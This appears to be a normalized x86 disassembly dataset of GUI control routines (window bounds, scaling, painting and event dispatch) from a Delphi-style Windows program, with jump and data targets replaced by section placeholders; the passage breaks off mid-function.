push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_4414f8
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_441520
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_441544
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_441568
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_441663
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_4038bc
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44166a
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_416340
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_4038bc
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_4038bc
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_416044
sub_441674
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_4421ac
mov edx edi
mov eax ebx
call sub_441724
mov edx edi
mov eax ebx
call sub_442fd4
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_4416e0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_404480
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_441724
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_441780
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_4417ac
mov edx eax
mov ecx esp
mov eax esi
call sub_414b3c
mov edx esp
mov eax ebx
call sub_441bf0
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4417c4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_441768
mov ecx esp
mov edx esi
call sub_414b3c
mov edx esp
mov eax ebx
call sub_441bf0
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4417ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44186d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441874
lea eax [ ebp - 0xc ]
call sub_40442c
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfdc
call sub_403e8c
sub_44187c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4418a8
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4418d4
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_45d3a8
sub_441904
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_442f30
sub_441980
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_421798
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_4217b4
sub_441b4c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_441be2
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_41e6fc
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_441d64
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_404828
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441be9
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_441d94
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_441bf0
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_441c38
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
test esi esi
je r-xdata
mov edx ebx
call sub_4451cc
mov edx ebx
mov eax esi
call sub_4450f8
mov eax ebx
call sub_4413b8
sub_441c84
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_4038bc
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_442f30
mov eax edi
mov si 0xffd0
call sub_4038bc
sub_441d1c
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_455a7c
mov edx ebx
mov eax esi
call sub_41e274
sub_441d40
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_442f30
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_442f30
pop ebx
retn
sub_441d64
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_441cd8
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_40451c
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_441ce8
sub_441d94
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_441de9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_441d64
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404828
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441df0
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov eax esi
call sub_4048dc
mov edx eax
mov eax ebx
call sub_441d40
sub_441e14
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_4216f4
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_442f30
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_4216f4
mov [ ebx + 0x84 ] eax
sub_441f9c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_441f8c
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_43ef48
mov eax esi
call sub_43ef48
jmp r-xdata
sub_441fd4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_4161fc
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_416090
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_41621c
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_4421ac
mov eax ebx
call sub_4592f4
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_4038bc
sub_442054
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_441fd4
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_441fd4
jmp r-xdata
sub_442078
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_44210e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442115
lea eax [ ebp - 0xc ]
call sub_40442c
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfdc
call sub_403e8c
sub_442120
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_4161fc
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_4161a0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_441704
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4421ac
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_448788
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_441704
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_448484
push eax
call InvalidateRect
push ebp
call sub_442120
pop ecx
test al al
je r-xdata
mov al 0x1
sub_442248
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_4592cc
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_442f30
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_4038bc
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4422ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_448788
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_448484
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_442385
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_446330
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_448484
push eax
call ReleaseDC
retn
sub_442424
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax edi
call sub_442f64
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_4418a8
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_4074a8
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_442f30
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_4400b4
sub_4424f8
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_442534
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_442580
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_4425ac
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_441d08
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_441cf4
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_402ab8
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_402ab8
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_448484
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_442690
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_4426dc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_4038bc
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_4038bc
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_4427a0
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_4427ec
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_442838
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
